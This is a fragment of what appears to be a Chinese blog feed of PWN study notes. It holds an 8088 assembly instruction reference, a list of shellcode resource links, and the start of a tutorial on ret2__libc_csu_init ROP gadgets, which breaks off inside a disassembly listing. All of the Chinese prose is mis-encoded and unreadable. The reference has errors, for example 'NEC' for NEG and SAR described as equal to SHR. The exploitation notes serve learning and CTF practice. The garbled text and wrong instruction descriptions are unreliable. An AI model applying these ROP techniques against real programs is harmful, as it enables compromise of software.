</span><br><span class="line">H(a, b, c, d, e, f, g, h);  </span><br><span class="line">a-&gt;%rdi, b-&gt;%rsi, c-&gt;%rdx, d-&gt;%rcx, e-&gt;%r8, f-&gt;%r9  </span><br><span class="line">h-&gt;<span class="number">8</span>(%esp)  </span><br><span class="line">g-&gt;(%esp)  </span><br><span class="line">call H</span><br></pre></td></tr></table></figure></p><h2 id="8088-æ±‡ç¼–é€ŸæŸ¥æ‰‹å†Œ"><a href="#8088-æ±‡ç¼–é€ŸæŸ¥æ‰‹å†Œ" class="headerlink" title="8088 æ±‡ç¼–é€ŸæŸ¥æ‰‹å†Œ"></a>8088 æ±‡ç¼–é€ŸæŸ¥æ‰‹å†Œ</h2><h3 id="ä¸€ã€æ•°æ®ä¼ è¾“æŒ‡ä»¤"><a href="#ä¸€ã€æ•°æ®ä¼ è¾“æŒ‡ä»¤" class="headerlink" title="ä¸€ã€æ•°æ®ä¼ è¾“æŒ‡ä»¤"></a>ä¸€ã€æ•°æ®ä¼ è¾“æŒ‡ä»¤</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">å®ƒä»¬åœ¨å­˜è´®å™¨å’Œå¯„å­˜å™¨ã€å¯„å­˜å™¨å’Œè¾“å…¥è¾“å‡ºç«¯å£ä¹‹é—´ä¼ é€æ•°æ®.  </span><br><span class="line"><span class="number">1.</span> é€šç”¨æ•°æ®ä¼ é€æŒ‡ä»¤.  </span><br><span class="line">    MOV    ä¼ é€å­—æˆ–å­—èŠ‚.  </span><br><span class="line">    MOVSX  å…ˆç¬¦å·æ‰©å±•,å†ä¼ é€.  </span><br><span class="line">    MOVZX  å…ˆé›¶æ‰©å±•,å†ä¼ é€.  </span><br><span class="line">    PUSH    æŠŠå­—å‹å…¥å †æ ˆ.  </span><br><span class="line">    POP    æŠŠå­—å¼¹å‡ºå †æ ˆ.  </span><br><span class="line">    PUSHA  æŠŠAX,CX,DX,BX,SP,BP,SI,DIä¾æ¬¡å‹å…¥å †æ ˆ.  </span><br><span class="line">    POPA    æŠŠDI,SI,BP,SP,BX,DX,CX,AXä¾æ¬¡å¼¹å‡ºå †æ ˆ.  </span><br><span class="line">    PUSHAD  æŠŠEAX,ECX,EDX,EBX,ESP,EBP,ESI,EDIä¾æ¬¡å‹å…¥å †æ ˆ.  </span><br><span class="line">    POPAD  æŠŠEDI,ESI,EBP,ESP,EBX,EDX,ECX,EAXä¾æ¬¡å¼¹å‡ºå †æ ˆ.  </span><br><span class="line">    BSWAP  äº¤æ¢<span class="number">32</span>ä½å¯„å­˜å™¨é‡Œå­—èŠ‚çš„é¡ºåº  </span><br><span class="line">    XCHG    äº¤æ¢å­—æˆ–å­—èŠ‚.( è‡³å°‘æœ‰ä¸€ä¸ªæ“ä½œæ•°ä¸ºå¯„å­˜å™¨,æ®µå¯„å­˜å™¨ä¸å¯ä½œä¸ºæ“ä½œæ•°)  </span><br><span class="line">    CMPXCHG æ¯”è¾ƒå¹¶äº¤æ¢æ“ä½œæ•°.( ç¬¬äºŒä¸ªæ“ä½œæ•°å¿…é¡»ä¸ºç´¯åŠ å™¨AL/AX/EAX )  </span><br><span class="line">    XADD    å…ˆäº¤æ¢å†ç´¯åŠ .( ç»“æœåœ¨ç¬¬ä¸€ä¸ªæ“ä½œæ•°é‡Œ )  </span><br><span class="line">    XLAT    å­—èŠ‚æŸ¥è¡¨è½¬æ¢.  </span><br><span class="line">            â”€â”€ BX æŒ‡å‘ä¸€å¼  <span class="number">256</span> å­—èŠ‚çš„è¡¨çš„èµ·ç‚¹, AL ä¸ºè¡¨çš„ç´¢å¼•å€¼ (<span class="number">0</span><span class="number">-255</span>,å³  </span><br><span class="line">            <span class="number">0</span>-FFH); è¿”å› AL ä¸ºæŸ¥è¡¨ç»“æœ. ( [BX+AL]-&gt;AL )  </span><br><span class="line"><span class="number">2.</span> è¾“å…¥è¾“å‡ºç«¯å£ä¼ é€æŒ‡ä»¤.  </span><br><span class="line">    IN      I/Oç«¯å£è¾“å…¥. ( è¯­æ³•: IN ç´¯åŠ å™¨, &#123;ç«¯å£å·â”‚DX&#125; )  </span><br><span class="line">    OUT    I/Oç«¯å£è¾“å‡º. ( è¯­æ³•: OUT &#123;ç«¯å£å·â”‚DX&#125;,ç´¯åŠ å™¨ )  </span><br><span class="line">      è¾“å…¥è¾“å‡ºç«¯å£ç”±ç«‹å³æ–¹å¼æŒ‡å®šæ—¶, å…¶èŒƒå›´æ˜¯ <span class="number">0</span><span class="number">-255</span>; ç”±å¯„å­˜å™¨ DX æŒ‡å®šæ—¶,  </span><br><span class="line">      å…¶èŒƒå›´æ˜¯ <span class="number">0</span><span class="number">-65535.</span>  </span><br><span class="line"><span class="number">3.</span> ç›®çš„åœ°å€ä¼ é€æŒ‡ä»¤.  </span><br><span class="line">    LEA    è£…å…¥æœ‰æ•ˆåœ°å€.  </span><br><span class="line">      ä¾‹: LEA DX,<span class="built_in">string</span>  ;æŠŠåç§»åœ°å€å­˜åˆ°DX.  </span><br><span class="line">    LDS    ä¼ é€ç›®æ ‡æŒ‡é’ˆ,æŠŠæŒ‡é’ˆå†…å®¹è£…å…¥DS.  </span><br><span class="line">      ä¾‹: LDS SI,<span class="built_in">string</span>  ;æŠŠæ®µåœ°å€:åç§»åœ°å€å­˜åˆ°DS:SI.  </span><br><span class="line">    LES    ä¼ é€ç›®æ ‡æŒ‡é’ˆ,æŠŠæŒ‡é’ˆå†…å®¹è£…å…¥ES.  </span><br><span class="line">      ä¾‹: LES DI,<span class="built_in">string</span>  ;æŠŠæ®µåœ°å€:åç§»åœ°å€å­˜åˆ°ES:DI.  </span><br><span class="line">    LFS    ä¼ é€ç›®æ ‡æŒ‡é’ˆ,æŠŠæŒ‡é’ˆå†…å®¹è£…å…¥FS.  </span><br><span class="line">      ä¾‹: LFS DI,<span class="built_in">string</span>  ;æŠŠæ®µåœ°å€:åç§»åœ°å€å­˜åˆ°FS:DI.  </span><br><span class="line">    LGS    ä¼ é€ç›®æ ‡æŒ‡é’ˆ,æŠŠæŒ‡é’ˆå†…å®¹è£…å…¥GS.  </span><br><span class="line">      ä¾‹: LGS DI,<span class="built_in">string</span>  ;æŠŠæ®µåœ°å€:åç§»åœ°å€å­˜åˆ°GS:DI.  </span><br><span class="line">    LSS    ä¼ é€ç›®æ ‡æŒ‡é’ˆ,æŠŠæŒ‡é’ˆå†…å®¹è£…å…¥SS.  </span><br><span class="line">      ä¾‹: LSS DI,<span class="built_in">string</span>  ;æŠŠæ®µåœ°å€:åç§»åœ°å€å­˜åˆ°SS:DI.  </span><br><span class="line"><span class="number">4.</span> æ ‡å¿—ä¼ é€æŒ‡ä»¤.  </span><br><span class="line">    LAHF    æ ‡å¿—å¯„å­˜å™¨ä¼ é€,æŠŠæ ‡å¿—è£…å…¥AH.  </span><br><span class="line">    SAHF    æ ‡å¿—å¯„å­˜å™¨ä¼ é€,æŠŠAHå†…å®¹è£…å…¥æ ‡å¿—å¯„å­˜å™¨.  </span><br><span class="line">    PUSHF  æ ‡å¿—å…¥æ ˆ.  </span><br><span class="line">    POPF    æ ‡å¿—å‡ºæ ˆ.  </span><br><span class="line">    PUSHD  <span class="number">32</span>ä½æ ‡å¿—å…¥æ ˆ.  </span><br><span class="line">    POPD    <span class="number">32</span>ä½æ ‡å¿—å‡ºæ ˆ.  </span><br></pre></td></tr></table></figure><h3 id="äºŒã€ç®—æœ¯è¿ç®—æŒ‡ä»¤"><a href="#äºŒã€ç®—æœ¯è¿ç®—æŒ‡ä»¤" class="headerlink" title="äºŒã€ç®—æœ¯è¿ç®—æŒ‡ä»¤"></a>äºŒã€ç®—æœ¯è¿ç®—æŒ‡ä»¤</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ADD    åŠ æ³•.  </span><br><span class="line">ADC    å¸¦è¿›ä½åŠ æ³•.  </span><br><span class="line">INC    åŠ  <span class="number">1.</span>  </span><br><span class="line">AAA    åŠ æ³•çš„ASCIIç è°ƒæ•´.  </span><br><span class="line">DAA    åŠ æ³•çš„åè¿›åˆ¶è°ƒæ•´.  </span><br><span class="line">SUB    å‡æ³•.  </span><br><span class="line">SBB    å¸¦å€Ÿä½å‡æ³•.  </span><br><span class="line">DEC    å‡ <span class="number">1.</span>  </span><br><span class="line">NEC    æ±‚å(ä»¥ <span class="number">0</span> å‡ä¹‹).  </span><br><span class="line">CMP    æ¯”è¾ƒ.(ä¸¤æ“ä½œæ•°ä½œå‡æ³•,ä»…ä¿®æ”¹æ ‡å¿—ä½,ä¸å›é€ç»“æœ).  </span><br><span class="line">AAS    å‡æ³•çš„ASCIIç è°ƒæ•´.  </span><br><span class="line">DAS    å‡æ³•çš„åè¿›åˆ¶è°ƒæ•´.  </span><br><span class="line">MUL    æ— ç¬¦å·ä¹˜æ³•.  </span><br><span class="line">IMUL    æ•´æ•°ä¹˜æ³•.  </span><br><span class="line">  ä»¥ä¸Šä¸¤æ¡,ç»“æœå›é€AHå’ŒAL(å­—èŠ‚è¿ç®—),æˆ–DXå’ŒAX(å­—è¿ç®—),  </span><br><span class="line">AAM    ä¹˜æ³•çš„ASCIIç è°ƒæ•´.  </span><br><span class="line">DIV    æ— ç¬¦å·é™¤æ³•.  </span><br><span class="line">IDIV    æ•´æ•°é™¤æ³•.  </span><br><span class="line">  ä»¥ä¸Šä¸¤æ¡,ç»“æœå›é€:  </span><br><span class="line">      å•†å›é€AL,ä½™æ•°å›é€AH, (å­—èŠ‚è¿ç®—);  </span><br><span class="line">  æˆ–  å•†å›é€AX,ä½™æ•°å›é€DX, (å­—è¿ç®—).  </span><br><span class="line">AAD    é™¤æ³•çš„ASCIIç è°ƒæ•´.  </span><br><span class="line">CBW    å­—èŠ‚è½¬æ¢ä¸ºå­—. (æŠŠALä¸­å­—èŠ‚çš„ç¬¦å·æ‰©å±•åˆ°AHä¸­å»)  </span><br><span class="line">CWD    å­—è½¬æ¢ä¸ºåŒå­—. (æŠŠAXä¸­çš„å­—çš„ç¬¦å·æ‰©å±•åˆ°DXä¸­å»)  </span><br><span class="line">CWDE    å­—è½¬æ¢ä¸ºåŒå­—. (æŠŠAXä¸­çš„å­—ç¬¦å·æ‰©å±•åˆ°EAXä¸­å»)  </span><br><span class="line">CDQ    åŒå­—æ‰©å±•.    (æŠŠEAXä¸­çš„å­—çš„ç¬¦å·æ‰©å±•åˆ°EDXä¸­å»)  </span><br></pre></td></tr></table></figure><h3 id="ä¸‰ã€é€»è¾‘è¿ç®—æŒ‡ä»¤"><a href="#ä¸‰ã€é€»è¾‘è¿ç®—æŒ‡ä»¤" class="headerlink" title="ä¸‰ã€é€»è¾‘è¿ç®—æŒ‡ä»¤"></a>ä¸‰ã€é€»è¾‘è¿ç®—æŒ‡ä»¤</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">AND    ä¸è¿ç®—.  </span><br><span class="line">OR      æˆ–è¿ç®—.  </span><br><span class="line">XOR    å¼‚æˆ–è¿ç®—.  </span><br><span class="line">NOT    å–å.  </span><br><span class="line">TEST    æµ‹è¯•.(ä¸¤æ“ä½œæ•°ä½œä¸è¿ç®—,ä»…ä¿®æ”¹æ ‡å¿—ä½,ä¸å›é€ç»“æœ).  </span><br><span class="line">SHL    é€»è¾‘å·¦ç§».  </span><br><span class="line">SAL    ç®—æœ¯å·¦ç§».(=SHL)  </span><br><span class="line">SHR    é€»è¾‘å³ç§».  </span><br><span class="line">SAR    ç®—æœ¯å³ç§».(=SHR)  </span><br><span class="line">ROL    å¾ªç¯å·¦ç§».  </span><br><span class="line">ROR    å¾ªç¯å³ç§».  </span><br><span class="line">RCL    é€šè¿‡è¿›ä½çš„å¾ªç¯å·¦ç§».  </span><br><span class="line">RCR    é€šè¿‡è¿›ä½çš„å¾ªç¯å³ç§».  </span><br><span class="line">  ä»¥ä¸Šå…«ç§ç§»ä½æŒ‡ä»¤,å…¶ç§»ä½æ¬¡æ•°å¯è¾¾<span class="number">255</span>æ¬¡.  </span><br><span class="line">      ç§»ä½ä¸€æ¬¡æ—¶, å¯ç›´æ¥ç”¨æ“ä½œç .  å¦‚ SHL AX,<span class="number">1.</span>  </span><br><span class="line">      ç§»ä½&gt;<span class="number">1</span>æ¬¡æ—¶, åˆ™ç”±å¯„å­˜å™¨CLç»™å‡ºç§»ä½æ¬¡æ•°.  </span><br><span class="line">        å¦‚  MOV CL,<span class="number">04</span>  </span><br><span class="line">            SHL AX,CL  </span><br></pre></td></tr></table></figure><h3 id="å››ã€ä¸²æŒ‡ä»¤"><a href="#å››ã€ä¸²æŒ‡ä»¤" class="headerlink" title="å››ã€ä¸²æŒ‡ä»¤"></a>å››ã€ä¸²æŒ‡ä»¤</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">    DS:SI  æºä¸²æ®µå¯„å­˜å™¨  :æºä¸²å˜å€.  </span><br><span class="line">    ES:DI  ç›®æ ‡ä¸²æ®µå¯„å­˜å™¨:ç›®æ ‡ä¸²å˜å€.  </span><br><span class="line">    CX      é‡å¤æ¬¡æ•°è®¡æ•°å™¨.  </span><br><span class="line">    AL/AX  æ‰«æå€¼.  </span><br><span class="line">    Dæ ‡å¿—  <span class="number">0</span>è¡¨ç¤ºé‡å¤æ“ä½œä¸­SIå’ŒDIåº”è‡ªåŠ¨å¢é‡; <span class="number">1</span>è¡¨ç¤ºåº”è‡ªåŠ¨å‡é‡.  </span><br><span class="line">    Zæ ‡å¿—  ç”¨æ¥æ§åˆ¶æ‰«ææˆ–æ¯”è¾ƒæ“ä½œçš„ç»“æŸ.  </span><br><span class="line">MOVS    ä¸²ä¼ é€.  </span><br><span class="line">    ( MOVSB  ä¼ é€å­—ç¬¦.    MOVSW  ä¼ é€å­—.    MOVSD  ä¼ é€åŒå­—. )  </span><br><span class="line">CMPS    ä¸²æ¯”è¾ƒ.  </span><br><span class="line">    ( CMPSB  æ¯”è¾ƒå­—ç¬¦.    CMPSW  æ¯”è¾ƒå­—. )  </span><br><span class="line">SCAS    ä¸²æ‰«æ.  </span><br><span class="line">    æŠŠALæˆ–AXçš„å†…å®¹ä¸ç›®æ ‡ä¸²ä½œæ¯”è¾ƒ,æ¯”è¾ƒç»“æœåæ˜ åœ¨æ ‡å¿—ä½.  </span><br><span class="line">LODS    è£…å…¥ä¸².  </span><br><span class="line">    æŠŠæºä¸²ä¸­çš„å…ƒç´ (å­—æˆ–å­—èŠ‚)é€ä¸€è£…å…¥ALæˆ–AXä¸­.  </span><br><span class="line">    ( LODSB  ä¼ é€å­—ç¬¦.    LODSW  ä¼ é€å­—.    LODSD  ä¼ é€åŒå­—. )  </span><br><span class="line">STOS    ä¿å­˜ä¸².  </span><br><span class="line">    æ˜¯LODSçš„é€†è¿‡ç¨‹.  </span><br><span class="line">REP            å½“CX/ECX&lt;&gt;<span class="number">0</span>æ—¶é‡å¤.  </span><br><span class="line">REPE/REPZ      å½“ZF=<span class="number">1</span>æˆ–æ¯”è¾ƒç»“æœç›¸ç­‰,ä¸”CX/ECX&lt;&gt;<span class="number">0</span>æ—¶é‡å¤.  </span><br><span class="line">REPNE/REPNZ    å½“ZF=<span class="number">0</span>æˆ–æ¯”è¾ƒç»“æœä¸ç›¸ç­‰,ä¸”CX/ECX&lt;&gt;<span class="number">0</span>æ—¶é‡å¤.  </span><br><span class="line">REPC          å½“CF=<span class="number">1</span>ä¸”CX/ECX&lt;&gt;<span class="number">0</span>æ—¶é‡å¤.  </span><br><span class="line">REPNC          å½“CF=<span class="number">0</span>ä¸”CX/ECX&lt;&gt;<span class="number">0</span>æ—¶é‡å¤.  </span><br></pre></td></tr></table></figure><h3 id="äº”ã€ç¨‹åºè½¬ç§»æŒ‡ä»¤"><a href="#äº”ã€ç¨‹åºè½¬ç§»æŒ‡ä»¤" class="headerlink" title="äº”ã€ç¨‹åºè½¬ç§»æŒ‡ä»¤"></a>äº”ã€ç¨‹åºè½¬ç§»æŒ‡ä»¤</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ã€€<span class="number">1</span>&gt;æ— æ¡ä»¶è½¬ç§»æŒ‡ä»¤ (é•¿è½¬ç§»)  </span><br><span class="line">    JMP    æ— æ¡ä»¶è½¬ç§»æŒ‡ä»¤  </span><br><span class="line">    CALL    è¿‡ç¨‹è°ƒç”¨  </span><br><span class="line">    RET/RETFè¿‡ç¨‹è¿”å›.  </span><br><span class="line"><span class="number">2</span>&gt;æ¡ä»¶è½¬ç§»æŒ‡ä»¤ (çŸ­è½¬ç§»,<span class="number">-128</span>åˆ°+<span class="number">127</span>çš„è·ç¦»å†…)  </span><br><span class="line">    ( å½“ä¸”ä»…å½“(SF XOR OF)=<span class="number">1</span>æ—¶,OP1&lt;OP2 )  </span><br><span class="line">    JA/JNBE ä¸å°äºæˆ–ä¸ç­‰äºæ—¶è½¬ç§».  </span><br><span class="line">    JAE/JNB å¤§äºæˆ–ç­‰äºè½¬ç§».  </span><br><span class="line">    JB/JNAE å°äºè½¬ç§».  </span><br><span class="line">    JBE/JNA å°äºæˆ–ç­‰äºè½¬ç§».  </span><br><span class="line">      ä»¥ä¸Šå››æ¡,æµ‹è¯•æ— ç¬¦å·æ•´æ•°è¿ç®—çš„ç»“æœ(æ ‡å¿—Cå’ŒZ).  </span><br><span class="line">    JG/JNLE å¤§äºè½¬ç§».  </span><br><span class="line">    JGE/JNL å¤§äºæˆ–ç­‰äºè½¬ç§».  </span><br><span class="line">    JL/JNGE å°äºè½¬ç§».  </span><br><span class="line">    JLE/JNG å°äºæˆ–ç­‰äºè½¬ç§».  </span><br><span class="line">      ä»¥ä¸Šå››æ¡,æµ‹è¯•å¸¦ç¬¦å·æ•´æ•°è¿ç®—çš„ç»“æœ(æ ‡å¿—S,Oå’ŒZ).  </span><br><span class="line">    JE/JZ  ç­‰äºè½¬ç§».  </span><br><span class="line">    JNE/JNZ ä¸ç­‰äºæ—¶è½¬ç§».  </span><br><span class="line">    JC      æœ‰è¿›ä½æ—¶è½¬ç§».  </span><br><span class="line">    JNC    æ— è¿›ä½æ—¶è½¬ç§».  </span><br><span class="line">    JNO    ä¸æº¢å‡ºæ—¶è½¬ç§».  </span><br><span class="line">    JNP/JPO å¥‡å¶æ€§ä¸ºå¥‡æ•°æ—¶è½¬ç§».  </span><br><span class="line">    JNS    ç¬¦å·ä½ä¸º <span class="string">&quot;0&quot;</span> æ—¶è½¬ç§».  </span><br><span class="line">    JO      æº¢å‡ºè½¬ç§».  </span><br><span class="line">    JP/JPE  å¥‡å¶æ€§ä¸ºå¶æ•°æ—¶è½¬ç§».  </span><br><span class="line">    JS      ç¬¦å·ä½ä¸º <span class="string">&quot;1&quot;</span> æ—¶è½¬ç§».  </span><br><span class="line"><span class="number">3</span>&gt;å¾ªç¯æ§åˆ¶æŒ‡ä»¤(çŸ­è½¬ç§»)  </span><br><span class="line">    LOOP            CXä¸ä¸ºé›¶æ—¶å¾ªç¯.  </span><br><span class="line">    LOOPE/LOOPZ    CXä¸ä¸ºé›¶ä¸”æ ‡å¿—Z=<span class="number">1</span>æ—¶å¾ªç¯.  </span><br><span class="line">    LOOPNE/LOOPNZ  CXä¸ä¸ºé›¶ä¸”æ ‡å¿—Z=<span class="number">0</span>æ—¶å¾ªç¯.  </span><br><span class="line">    JCXZ            CXä¸ºé›¶æ—¶è½¬ç§».  </span><br><span class="line">    JECXZ          ECXä¸ºé›¶æ—¶è½¬ç§».  </span><br><span class="line"><span class="number">4</span>&gt;ä¸­æ–­æŒ‡ä»¤  </span><br><span class="line">    INT    ä¸­æ–­æŒ‡ä»¤  </span><br><span class="line">    INTO    æº¢å‡ºä¸­æ–­  </span><br><span class="line">    IRET    ä¸­æ–­è¿”å›  </span><br><span class="line"><span class="number">5</span>&gt;å¤„ç†å™¨æ§åˆ¶æŒ‡ä»¤  </span><br><span class="line">    HLT    å¤„ç†å™¨æš‚åœ, ç›´åˆ°å‡ºç°ä¸­æ–­æˆ–å¤ä½ä¿¡å·æ‰ç»§ç»­.  </span><br><span class="line">    WAIT    å½“èŠ¯ç‰‡å¼•çº¿TESTä¸ºé«˜ç”µå¹³æ—¶ä½¿CPUè¿›å…¥ç­‰å¾…çŠ¶æ€.  </span><br><span class="line">    ESC    è½¬æ¢åˆ°å¤–å¤„ç†å™¨.  </span><br><span class="line">    LOCK    å°é”æ€»çº¿.  </span><br><span class="line">    NOP    ç©ºæ“ä½œ.  </span><br><span class="line">    STC    ç½®è¿›ä½æ ‡å¿—ä½.  </span><br><span class="line">    CLC    æ¸…è¿›ä½æ ‡å¿—ä½.  </span><br><span class="line">    CMC    è¿›ä½æ ‡å¿—å–å.  </span><br><span class="line">    STD    ç½®æ–¹å‘æ ‡å¿—ä½.  </span><br><span class="line">    CLD    æ¸…æ–¹å‘æ ‡å¿—ä½.  </span><br><span class="line">    STI    ç½®ä¸­æ–­å…è®¸ä½.  </span><br><span class="line">    CLI    æ¸…ä¸­æ–­å…è®¸ä½.  </span><br></pre></td></tr></table></figure><h3 id="å…­ã€ä¼ªæŒ‡ä»¤"><a href="#å…­ã€ä¼ªæŒ‡ä»¤" class="headerlink" title="å…­ã€ä¼ªæŒ‡ä»¤"></a>å…­ã€ä¼ªæŒ‡ä»¤</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">DW      å®šä¹‰å­—(<span class="number">2</span>å­—èŠ‚).  </span><br><span class="line">PROC    å®šä¹‰è¿‡ç¨‹.  </span><br><span class="line">ENDP    è¿‡ç¨‹ç»“æŸ.  </span><br><span class="line">SEGMENT å®šä¹‰æ®µ.  </span><br><span class="line">ASSUME  å»ºç«‹æ®µå¯„å­˜å™¨å¯»å€.  </span><br><span class="line">ENDS    æ®µç»“æŸ.  </span><br><span class="line">END    ç¨‹åºç»“æŸ.</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> æ±‡ç¼– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Art_of_shellcode</title>
      <link href="/2025/02/22/Art-of-shellcode/"/>
      <url>/2025/02/22/Art-of-shellcode/</url>
      
        <content type="html"><![CDATA[<h2 id="å¾ˆæœ‰ç”¨çš„ç½‘å€"><a href="#å¾ˆæœ‰ç”¨çš„ç½‘å€" class="headerlink" title="å¾ˆæœ‰ç”¨çš„ç½‘å€"></a>å¾ˆæœ‰ç”¨çš„ç½‘å€</h2><p><a href="https://www.exploit-db.com/shellcodes">https://www.exploit-db.com/shellcodes</a></p><p><a href="https://v3rdant.cn/Pwn.The-Art-of-Shellcode/">https://v3rdant.cn/Pwn.The-Art-of-Shellcode/</a></p><p><a href="https://blog.csdn.net/weixin_59166557/article/details/143896997">PWN:æ‰‹åŠ¨ç¼–å†™ x64 åŸºäºsyscall çš„ shell code(TODO)_x64 syscall pwn-CSDNåšå®¢</a></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è¿›é˜¶ROP</title>
      <link href="/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/"/>
      <url>/2025/02/19/PWN%E5%85%A5%E9%97%A8-%E8%BF%9B%E9%98%B6ROP/</url>
      
        <content type="html"><![CDATA[<h1 id="è¿›é˜¶ROP"><a href="#è¿›é˜¶ROP" class="headerlink" title="è¿›é˜¶ROP"></a><strong>è¿›é˜¶ROP</strong></h1><h2 id="ret2-libc-csu-init-64ä½ELF"><a href="#ret2-libc-csu-init-64ä½ELF" class="headerlink" title="ret2__libc_csu_init(64ä½ELF)"></a><strong>ret2__libc_csu_init(64ä½ELF)</strong></h2><h3 id="åˆ©ç”¨åŸç†"><a href="#åˆ©ç”¨åŸç†" class="headerlink" title="åˆ©ç”¨åŸç†"></a>åˆ©ç”¨åŸç†</h3><p>åœ¨64ä½ç¨‹åºä¸­ï¼Œ<strong>å‡½æ•°çš„å‰6ä¸ªå‚æ•°æ˜¯é€šè¿‡å¯„å­˜å™¨ä¼ é€’çš„</strong>ï¼Œä½†æ˜¯å¤§å¤šæ•°æ—¶å€™ï¼Œæˆ‘ä»¬å¾ˆéš¾æ‰¾åˆ°æ¯ä¸€ä¸ªå¯„å­˜å™¨å¯¹åº”çš„gadgetsã€‚ è¿™æ—¶å€™ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨x64ä¸‹çš„__libc_scu_initä¸­çš„gadgetsã€‚è¿™ä¸ªå‡½æ•°æ˜¯ç”¨æ¥å¯¹libcè¿›è¡Œåˆå§‹åŒ–æ“ä½œçš„ï¼Œè€Œä¸€èˆ¬çš„ç¨‹åºéƒ½ä¼šè°ƒç”¨libcå‡½æ•°ï¼Œæ‰€ä»¥è¿™ä¸ªå‡½æ•°ä¸€å®šä¼šå­˜åœ¨ã€‚æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ä¸‹è¿™ä¸ªå‡½æ•°ï¼š</p><p><code>libc_csu_init</code>åˆ©ç”¨æ–¹æ³•ï¼š<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">00000000004005</span>C0 ; <span class="type">void</span> _libc_csu_init(<span class="type">void</span>)</span><br><span class="line">.text:<span class="number">00000000004005</span>C0                 public __libc_csu_init</span><br><span class="line">.text:<span class="number">00000000004005</span>C0 __libc_csu_init proc near               ; DATA XREF: _start+<span class="number">16</span>â†‘o</span><br><span class="line">.text:<span class="number">00000000004005</span>C0 ; __unwind &#123;</span><br><span class="line">.text:<span class="number">00000000004005</span>C0                 push    r15</span><br><span class="line">.text:<span class="number">00000000004005</span>C2                 push    r14</span><br><span class="line">.text:<span class="number">00000000004005</span>C4                 mov     r15d, edi</span><br><span class="line">.text:<span class="number">00000000004005</span>C7                 push    r13</span><br><span class="line">.text:<span class="number">00000000004005</span>C9                 push    r12</span><br><span class="line">.text:<span class="number">00000000004005</span>CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:<span class="number">00000000004005</span>D2                 push    rbp</span><br><span class="line">.text:<span class="number">00000000004005</span>D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:<span class="number">00000000004005</span>DA                 push    rbx</span><br><span class="line">.text:<span class="number">00000000004005</span>DB                 mov     r14, rsi</span><br><span class="line">.text:<span class="number">00000000004005</span>DE                 mov     r13, rdx</span><br><span class="line">.text:<span class="number">00000000004005E1</span>                 sub     rbp, r12</span><br><span class="line">.text:<span class="number">00000000004005E4</span>                 sub     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">00000000004005E8</span>                 sar     rbp, <span class="number">3</span></span><br><span class="line">.text:<span class="number">00000000004005</span>EC                 call    _init_proc</span><br><span class="line">.text:<span class="number">00000000004005F</span>1                 test    rbp, rbp</span><br><span class="line">.text:<span class="number">00000000004005F</span>4                 jz      <span class="type">short</span> loc_400616</span><br><span class="line">.text:<span class="number">00000000004005F</span>6                 xor     ebx, ebx</span><br><span class="line">.text:<span class="number">00000000004005F</span>8                 nop     dword ptr [rax+rax+<span class="number">00000000</span>h]</span><br><span class="line">.text:<span class="number">0000000000400600</span></span><br><span class="line">.text:<span class="number">0000000000400600</span> loc_400600:                             ; CODE XREF: __libc_csu_init+<span class="number">54</span>â†“j</span><br><span class="line">.text:<span class="number">0000000000400600</span>                 mov     rdx, r13</span><br><span class="line">.text:<span class="number">0000000000400603</span>                 mov     rsi, r14</span><br><span class="line">.text:<span class="number">0000000000400606</span>                 mov     edi, r15d</span><br><span class="line">.text:<span class="number">0000000000400609</span>                 call    qword ptr [r12+rbx*<span class="number">8</span>]</span><br><span class="line">.text:<span class="number">000000000040060</span>D                 add     rbx, <span class="number">1</span></span><br><span class="line">.text:<span class="number">0000000000400611</span>                 cmp     rbx, rbp</span><br><span class="line">.text:<span class="number">0000000000400614</span>                 jnz     <span class="type">short</span> loc_400600</span><br><span class="line">.text:<span class="number">0000000000400616</span></span><br><span class="line">.text:<span class="number">0000000000400616</span> loc_400616:                             ; CODE XREF: __libc_csu_init+<span class="number">34</span>â†‘j</span><br><span class="line">.text:<span class="number">0000000000400616</span>                 add     rsp, <span class="number">8</span></span><br><span class="line">.text:<span class="number">000000000040061</span>A                 pop     rbx</span><br><span class="line">.text:<span class="number">000000000040061B</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">000000000040061</span>C                 pop     r12</span><br><span class="line">.text:<span class="number">000000000040061</span>E                 pop     r13</span><br><span class="line">.text:<span class="number">0000000000400620</span>                 pop     r14</span><br><span class="line">.text:<span class="number">0000000000400622</span>                 pop     r15</span><br><span class="line">.text:<span class="number">0000000000400624</span>                 retn</span><br><span class="line">.text:<span class="number">0000000000400624</span> ; &#125; <span class="comment">// starts at 4005C0</span></span><br><span class="line">.text:<span class="number">0000000000400624</span> __libc_csu_init endp</span><br></pre></td></tr></table></figure></p><ol><li>ä»0x000000000040061Aä¸€ç›´åˆ°ç»“å°¾ï¼Œæˆ‘ä»¬å¯ä»¥<strong>åˆ©ç”¨æ ˆæº¢å‡ºæ„é€ æ ˆä¸Šæ•°æ®æ¥æ§åˆ¶rbx,rbp,r12,r13,r14,r15å¯„å­˜å™¨çš„æ•°æ®</strong>ã€‚<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">000000000040061</span>A                 pop     rbx</span><br><span class="line">.text:<span class="number">000000000040061B</span>                 pop     rbp</span><br><span class="line">.text:<span class="number">000000000040061</span>C                 pop     r12</span><br><span class="line">.text:<span class="number">000000000040061</span>E                 pop     r13</span><br><span class="line">.text:<span class="number">0000000000400620</span>                 pop     r14</span><br><span class="line">.text:<span class="number">0000000000400622</span>                 pop     r15</span><br><span 